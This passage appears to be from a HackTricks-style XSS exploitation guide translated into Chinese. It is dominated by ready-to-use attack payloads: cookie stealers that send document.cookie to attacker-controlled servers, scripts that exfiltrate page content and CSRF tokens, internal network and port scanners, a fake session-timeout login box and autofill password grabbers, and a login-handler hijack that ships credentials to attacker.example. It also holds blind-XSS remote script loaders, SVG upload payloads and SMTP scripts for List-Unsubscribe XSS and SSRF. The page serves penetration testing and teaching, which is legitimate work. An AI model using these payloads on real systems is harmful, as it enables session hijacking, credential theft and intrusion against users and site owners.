### 多个 payloads 合并为 1 个


{{#ref}}
steal-info-js.md
{{#endref}}

### Iframe 陷阱

使用户在页面内导航而不离开 iframe，并窃取其操作（包括通过表单发送的信息）：


{{#ref}}
../iframe-traps.md
{{#endref}}

### 获取 Cookies
```javascript
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```
> [!TIP]
> 你**将无法从 JavaScript 访问 cookies**，如果 cookie 设置了 HTTPOnly 标志。但如果你足够幸运，这里有 [some ways to bypass this protection](../hacking-with-cookies/index.html#httponly)。
### 窃取页面内容
```javascript
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8"
var attacker = "http://10.10.14.8/exfil"
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open("GET", url, true)
xhr.send(null)
```
### 查找内部 IPs
```html
<script>
var q = []
var collaboratorURL =
"http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net"
var wait = 2000
var n_threads = 51

// Prepare the fetchUrl functions to access all the possible
for (i = 1; i <= 255; i++) {
q.push(
(function (url) {
return function () {
fetchUrl(url, wait)
}
})("http://192.168.0." + i + ":8080")
)
}

// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
for (i = 1; i <= n_threads; i++) {
if (q.length) q.shift()()
}

function fetchUrl(url, wait) {
console.log(url)
var controller = new AbortController(),
signal = controller.signal
fetch(url, { signal })
.then((r) =>
r.text().then((text) => {
location =
collaboratorURL +
"?ip=" +
url.replace(/^http:\/\//, "") +
"&code=" +
encodeURIComponent(text) +
"&" +
Date.now()
})
)
.catch((e) => {
if (!String(e).includes("The user aborted a request") && q.length) {
q.shift()()
}
})

setTimeout((x) => {
controller.abort()
if (q.length) {
q.shift()()
}
}, wait)
}
</script>
```
### Port Scanner (fetch)
```javascript
const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
```
### Port Scanner (websockets)
```python
var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i<ports.length; i++) {
var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
s.start = performance.now();
s.port = ports[i];
s.onerror = function() {
console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
};
s.onopen = function() {
console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
};
}
```
_Short times indicate a responding port_ _Longer times indicate no response._

Review the list of ports banned in Chrome [**here**](https://src.chromium.org/viewvc/chrome/trunk/src/net/base/net_util.cc) and in Firefox [**here**](https://www-archive.mozilla.org/projects/netlib/portbanning#portlist).

### 用于请求凭据的框
```html
<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>
```
### 自动填充 passwords 捕获
```javascript
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
当任何数据在 password field 中输入时，username 和 password 会被发送到攻击者的服务器；即使客户端选择了 saved password 而没有手动输入任何内容，credentials 也会被 ex-filtrated。

### Hijack form handlers to exfiltrate credentials (const shadowing)

如果一个关键的 handler（例如 `function DoLogin(){...}`）在页面后面声明，而你的 payload 早些时候运行（例如通过 inline JS-in-JS sink），先定义一个同名的 `const` 来抢占并锁定该 handler。后续的 function 声明无法重新绑定 `const` 名称，因而你的 hook 将保持控制：
```javascript
const DoLogin = () => {
const pwd  = Trim(FormInput.InputPassword.value);
const user = Trim(FormInput.InputUtente.value);
fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));
};
```
注意事项
- 这依赖于执行顺序：你的注入必须在合法声明之前执行。
- 如果你的 payload 被包裹在 `eval(...)` 中，`const/let` 绑定不会成为全局变量。使用来自章节 “Deliverable payloads with eval(atob()) and scope nuances” 的动态 `<script>` 注入技术，以确保真正的全局且不可重新绑定的绑定。
- 当关键字过滤阻止代码时，结合使用 Unicode 转义标识符或 `eval(atob('...'))` 传递，如上所示。

### Keylogger

我在 github 上简单搜索后发现几个不同的项目：

- [https://github.com/JohnHoder/Javascript-Keylogger](https://github.com/JohnHoder/Javascript-Keylogger)
- [https://github.com/rajeshmajumdar/keylogger](https://github.com/rajeshmajumdar/keylogger)
- [https://github.com/hakanonymos/JavascriptKeylogger](https://github.com/hakanonymos/JavascriptKeylogger)
- 你也可以使用 metasploit 的 `http_javascript_keylogger`

### 窃取 CSRF tokens
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/email/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
### 窃取 PostMessage 消息
```html
<img src="https://attacker.com/?" id=message>
<script>
window.onmessage = function(e){
document.getElementById("message").src += "&"+e.data;
</script>
```
### PostMessage-origin 脚本加载器 (opener-gated)

如果一个页面 **存储 `event.origin` 来自 `postMessage` 并在稍后将其连接到脚本 URL**，发送者控制已加载 JS 的 **origin**：
```javascript
window.addEventListener('message', (event) => {
if (event.data.msg_type === 'IWL_BOOTSTRAP') {
localStorage.setItem('CFG', {host: event.origin, pixelID: event.data.pixel_id});
startIWL(); // later loads `${host}/sdk/${pixelID}/iwl.js`
}
});
```
Exploitation recipe (from CAPIG):

- **Gates**: 仅在 `window.opener` 存在且 `pixel_id` 被 allowlisted 时触发；**origin is never checked**。
- **Use CSP-allowed origin**: pivot 到一个已被受害者 CSP 允许的域（例如，允许分析的已登出帮助页面，如 `*.THIRD-PARTY.com`），并通过 takeover/XSS/upload 在该域托管 `/sdk/<pixel_id>/iwl.js`。
- **Restore `opener`**: 在 Android WebView 中，`window.name='x'; window.open(target,'x')` 会使页面成为其自身的 opener；从被劫持的 iframe 发送恶意的 `postMessage`。
- **Trigger**: 该 iframe 发布 `{msg_type:'IWL_BOOTSTRAP', pixel_id:<allowed>}`；父页面随后从 CSP-allowed origin 加载攻击者的 `iwl.js` 并执行它。

这会将缺乏 origin 检查的 `postMessage` 验证变成一个可以绕过 CSP 的 **remote script loader primitive**，前提是你能落在策略已允许的任意 origin 上。

### Supply-chain stored XSS via backend JS concatenation

当后端通过将 JS 字符串与用户可控值拼接来构建共享 SDK 时，任何引号/结构破坏符都能注入脚本，并被提供给所有消费者：

- Example pattern (Meta CAPIG): server appends `cbq.config.set("<pixel>","IWLParameters",{params: <user JSON>});` directly into `capig-events.js`.
- Injecting `'` or `"]}` closes the literal/object and adds attacker JS, creating **stored XSS** in the distributed SDK for every site that loads it (first-party and third-party).

### Stored XSS in generated reports when escaping is disabled

如果上传的文件被解析且其元数据被打印到 HTML 报告中但未进行转义（例如使用 `|safe` 或自定义渲染器），那么这些元数据就是一个 **stored XSS sink**。示例流程：
```python
xmlhost = data.getAttribute(f'{ns}:host')
ret_list.append(('dialer_code_found', (xmlhost,), ()))
'title': a_template['title'] % t_name  # %s fed by xmlhost
```
Django 模板渲染 `{{item|key:"title"|safe}}`，因此攻击者的 HTML 会被执行。

**Exploit:** 将 **实体编码的 HTML** 放到任何会出现在报告中的 manifest/config 字段：
```xml
<data android:scheme="android_secret_code"
android:host="&lt;img src=x onerror=alert(document.domain)&gt;"/>
```
使用 `|safe` 呈现时，报告输出 `<img ...>` 并在查看时触发 JS。

**Hunting：** 查找那些在 `%s`/f-strings 中重用已解析字段并禁用自动转义的 report/notification builders。上传的 manifest/log/archive 中一个被编码的标签会对每位查看者保留 XSS。

### 滥用 Service Workers


{{#ref}}
abusing-service-workers.md
{{#endref}}

### 访问 Shadow DOM


{{#ref}}
shadow-dom.md
{{#endref}}

### Polyglots


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt
{{#endref}}

### Blind XSS payloads

你也可以使用: [https://xsshunter.com/](https://xsshunter.com)
```html
"><img src='//domain/xss'>
"><script src="//domain/xss.js"></script>
><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>

<!-- html5sec - Self-executing focus event via autofocus: -->
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>

<!-- html5sec - JavaScript execution via iframe and onload -->
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">

<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>

<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- xsshunter.com - Sites that use JQuery -->
<script>$.getScript("//domain")</script>

<!-- xsshunter.com - When <script> is filtered -->
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>

<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>

<!-- noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- whitelisted CDNs in CSP -->
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>

<!-- Payloads from https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide -->
<!-- Image tag -->
'"><img src="x" onerror="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- Input tag with autofocus -->
'"><input autofocus onfocus="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- In case jQuery is loaded, we can make use of the getScript method -->
'"><script>$.getScript("{SERVER}/script.js")</script>

<!-- Make use of the JavaScript protocol (applicable in cases where your input lands into the "href" attribute or a specific DOM sink) -->
javascript:eval(atob("Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw=="))

<!-- Render an iframe to validate your injection point and receive a callback -->
'"><iframe src="{SERVER}"></iframe>

<!-- Bypass certain Content Security Policy (CSP) restrictions with a base tag -->
<base href="{SERVER}" />

<!-- Make use of the meta-tag to initiate a redirect -->
<meta http-equiv="refresh" content="0; url={SERVER}" />

<!-- In case your target makes use of AngularJS -->
{{constructor.constructor("import('{SERVER}/script.js')")()}}
```
### Regex - 访问隐藏内容

来自 [**this writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-piyosay)，可以了解到，即使某些值在 JS 中消失，仍然可以在不同对象的 JS 属性中找到它们。例如，即使 regex 的输入值被移除，仍然可以找到该 REGEX 的输入：
```javascript
// Do regex with flag
flag = "CTF{FLAG}"
re = /./g
re.test(flag)

// Remove flag value, nobody will be able to get it, right?
flag = ""

// Access previous regex input
console.log(RegExp.input)
console.log(RegExp.rightContext)
console.log(
document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"]
)
```
### Brute-Force List


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt
{{#endref}}

## XSS 滥用其他漏洞

### XSS 在 Markdown 中

可以注入会被渲染的 Markdown 代码吗？也许你可以触发 XSS！查看：


{{#ref}}
xss-in-markdown.md
{{#endref}}

### XSS 升级为 SSRF

在一个**使用缓存的站点**上发现了 XSS？尝试通过 Edge Side Include Injection 将其**升级为 SSRF**，使用以下 payload：
```python
<esi:include src="http://yoursite.com/capture" />
```
Use it to bypass cookie restrictions, XSS filters and much more!\
More information about this technique here: [**XSLT**](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md).

### XSS in 动态创建的 PDF

如果网页使用用户可控的输入创建 PDF，你可以尝试**欺骗负责创建 PDF 的 bot**去**执行任意 JS 代码**。\
因此，如果**PDF 创建 bot 发现**某些**HTML**标签，它会**解释**它们，你可以**滥用**这一行为来导致**Server XSS**。


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}

如果你无法注入 HTML 标签，值得尝试**注入 PDF 数据**：


{{#ref}}
pdf-injection.md
{{#endref}}

### XSS in Amp4Email

AMP 致力于提升移动设备上的网页性能，采用 HTML 标签并辅以 JavaScript 来保证功能，侧重于速度和安全。它支持多种组件来实现不同功能，可通过 [AMP components](https://amp.dev/documentation/components/?format=websites) 访问。

[**AMP for Email**](https://amp.dev/documentation/guides-and-tutorials/learn/email-spec/amp-email-format/) 格式将特定的 AMP 组件扩展到邮件中，使收件人能够直接在邮件内与内容交互。

Example [**writeup XSS in Amp4Email in Gmail**](https://adico.me/post/xss-in-gmail-s-amp4email).

### List-Unsubscribe Header Abuse (Webmail XSS & SSRF)

RFC 2369 的 `List-Unsubscribe` header 嵌入了攻击者控制的 URI，许多 webmail 和邮件客户端会自动将其转换为“Unsubscribe”按钮。当这些 URI 在未经过验证的情况下被渲染或被获取时，该 header 就成为注入点，既可以导致存储型 XSS（如果退订链接被放入 DOM），也可以导致 SSRF（如果服务器代表用户执行退订请求）。

#### Stored XSS via `javascript:` URIs

1. **给自己发送一封邮件**，其中 header 指向一个 `javascript:` URI，同时保持邮件其余部分尽量无害，以免被垃圾邮件过滤器丢弃。
2. **确保 UI 渲染该值**（许多客户端会在“List Info”面板中显示），并检查生成的 `<a>` 标签是否继承了攻击者控制的属性，例如 `href` 或 `target`。
3. **触发执行**（例如 CTRL+click、中键点击，或“open in new tab”）当链接使用 `target="_blank"` 时；浏览器会在 webmail 应用的 origin 中评估所提供的 JavaScript。
4. Observe the stored-XSS primitive: payload 与邮件一同持久存在，只需一次点击即可执行.
```text
List-Unsubscribe: <javascript://attacker.tld/%0aconfirm(document.domain)>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
URI 中的换行字节 (`%0a`) 表明即使是不常见的字符也会在易受攻击的客户端（例如 Horde IMP H5）的渲染流程中存活下来，该客户端会将该字符串按原样输出到 <a> 标签内。

<details>
<summary>传递恶意 List-Unsubscribe header 的 Minimal SMTP PoC</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
sender = "list@example.org"
recipient = "victim@example.org"

msg = EmailMessage()
msg.set_content("Testing List-Unsubscribe rendering")
msg["From"] = sender
msg["To"] = recipient
msg["Subject"] = "Newsletter"
msg["List-Unsubscribe"] = "<javascript://evil.tld/%0aconfirm(document.domain)>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

#### 服务器端退订代理 -> SSRF

某些客户端，例如 Nextcloud Mail app，会在服务器端代理退订操作：点击该按钮会指示服务器自行获取提供的 URL。这会将该 header 转变为一个 SSRF 原语，尤其是在管理员将 `'allow_local_remote_servers' => true`（文档见 [HackerOne report 2902856](https://hackerone.com/reports/2902856)）设置为允许对 loopback 和 RFC1918 网段发起请求时。

1. **构造一封邮件**，其中 `List-Unsubscribe` 指向攻击者控制的 endpoint（针对盲 SSRF 使用 Burp Collaborator / OAST）。
2. **保留 `List-Unsubscribe-Post: List-Unsubscribe=One-Click`**，以便 UI 显示单次点击退订按钮。
3. **满足信任要求**：例如 Nextcloud 仅在消息通过 DKIM 时才执行 HTTPS 退订请求，因此攻击者必须使用其控制的域对邮件进行签名。
4. **将消息投递到由目标服务器处理的邮箱**，并等待用户点击退订按钮。
5. **在 collaborator 端点观察服务器端回调**，一旦该原语被确认，再 pivot 到内部地址。
```text
List-Unsubscribe: <http://abcdef.oastify.com>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
<details>
<summary>用于 SSRF 测试的 DKIM 签名 List-Unsubscribe 消息</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage
import dkim

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
dkim_selector = "default"
dkim_domain = "example.org"
dkim_private_key = """-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----"""

msg = EmailMessage()
msg.set_content("One-click unsubscribe test")
msg["From"] = "list@example.org"
msg["To"] = "victim@example.org"
msg["Subject"] = "Mailing list"
msg["List-Unsubscribe"] = "<http://abcdef.oastify.com>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

raw = msg.as_bytes()
signature = dkim.sign(
message=raw,
selector=dkim_selector.encode(),
domain=dkim_domain.encode(),
privkey=dkim_private_key.encode(),
include_headers=["From", "To", "Subject"]
)
msg["DKIM-Signature"] = signature.decode().split(": ", 1)[1].replace("\r", "").replace("\n", "")

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

**测试说明**

- 使用 OAST endpoint 收集盲 SSRF 命中；一旦该原语被确认，将 `List-Unsubscribe` URL 调整为指向 `http://127.0.0.1:PORT`、元数据服务，或其他内部主机。
- 因为退订助手通常会重用与应用相同的 HTTP 堆栈，你会继承它的代理设置、HTTP verbs 和 header rewrites，从而可以利用 [SSRF methodology](../ssrf-server-side-request-forgery/README.md) 中描述的进一步遍历技巧。

### XSS 上传文件 (svg)

将如下文件作为图片上传（来自 [http://ghostlulz.com/xss-svg/](http://ghostlulz.com/xss-svg/)）：
```html
Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert(1);
</script>
</svg>
-----------------------------232181429808--
```

```html
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert("XSS")</script>
</svg>
```

```html
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>
```

```svg
<svg width="500" height="500"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>

<foreignObject width="500" height="500">
<iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
<iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
</foreignObject>
</svg>
```

```html
<svg><use href="//portswigger-labs.net/use_element/upload.php#x" /></svg>
```

```xml
<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
```
查找 **更多 SVG payloads 在** [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)

## 杂项 JS 技巧与相关信息


{{#ref}}
other-js-tricks.md
{{#endref}}

## XSS 资源

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
- [http://www.xss-payloads.com](http://www.xss-payloads.com) [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt) [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)
- [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
- [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
- [https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)
- [https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide](https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide)

## 参考资料

- [Turning a harmless XSS behind a WAF into a realistic phishing vector](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/)
- [XSS and SSRF via the List-Unsubscribe SMTP Header in Horde Webmail and Nextcloud Mail](https://security.lauritz-holtmann.de/post/xss-ssrf-list-unsubscribe/)
- [HackerOne Report #2902856 - Nextcloud Mail List-Unsubscribe SSRF](https://hackerone.com/reports/2902856)
- [From "Low-Impact" RXSS to Credential Stealer: A JS-in-JS Walkthrough](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)
- [MDN eval()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)
- [CAPIG XSS: postMessage origin trust becomes a script loader + backend JS concatenation enables supply-chain stored XSS](https://ysamm.com/uncategorized/2026/01/13/capig-xss.html)
- [MobSF stored XSS via manifest analysis (unsafe Django safe sink)](https://github.com/advisories/GHSA-8hf7-h89p-3pqj)

{{#include ../../banners/hacktricks-training.md}}
